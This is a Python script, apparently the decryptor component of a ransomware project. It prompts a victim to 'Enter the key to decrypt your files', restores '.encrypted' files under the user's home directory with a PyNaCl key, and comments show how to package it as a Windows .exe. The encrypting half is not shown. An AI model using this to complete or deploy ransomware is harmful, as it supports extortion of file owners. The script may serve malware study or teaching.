#!/usr/bin/python3
import sys
import nacl.secret as ns
import pathlib, os
from tkinter import *
from tkinter import ttk
import _cffi_backend        # for PyInstaller. If removed, PyInstaller will fail

# ---------------------------------------------------------------
# Convert .py to .exe:
# PyInstaller --onefile -w --icon icon.png Decryptor.py
# PyInstaller --hidden-import=_cffi_backend --onefile -w --icon icon.png Decryptor.py
# ---------------------------------------------------------------

Key = None
win = Tk()
win.geometry("550x130")
win.title("Insert Key")


def get_user_input():
   global entry
   global Key
   keyhex = entry.get()
   Key = bytes.fromhex(keyhex)
   win.destroy()


def close():
    win.destroy()
    sys.exit()


win.protocol("WM_DELETE_WINDOW", close)

label=Label(win, text="Enter the key to decrypt your files", font="Courier 14")
label.pack()

entry= Entry(win, width=75)
entry.focus_set()
entry.pack()

ttk.Button(win, text="Okay", width=75, command=get_user_input).pack(pady=20)
win.mainloop()

if not Key:
    with open('C:\\malware\\ransomware\\secrets\\key.txt', mode='rb') as f:
        Key = f.read()

box = ns.SecretBox(Key)

User = os.getlogin()
Paths = [f'C:\\Users\\{User}']


class Decrypt(object):

    def __init__(self, Target,BoxM):     
        self.Target = Target
        self.BoxM = BoxM

    def FileE(loc):
        DeFileN = (loc.Target).replace(".encrypted", "")
        EnFileN = loc.Target

        try:
            with open(EnFileN, "rb") as f:
                data = f.read()

            with open(DeFileN, "wb") as f:
                f.write(loc.BoxM.decrypt(data))
            os.remove(EnFileN)

        except:
            print(f"error decryptin file {DeFileN}")


if __name__ == '__main__':
    for AllFiles in Paths:
        if (pathlib.Path(AllFiles).exists()):
            for path, subdirs, files in os.walk(AllFiles):
                for file in files :
                    if(".encrypted" in file):
                        FilePath = os.path.join(path, file)
                        Decrypt(FilePath, box).FileE()
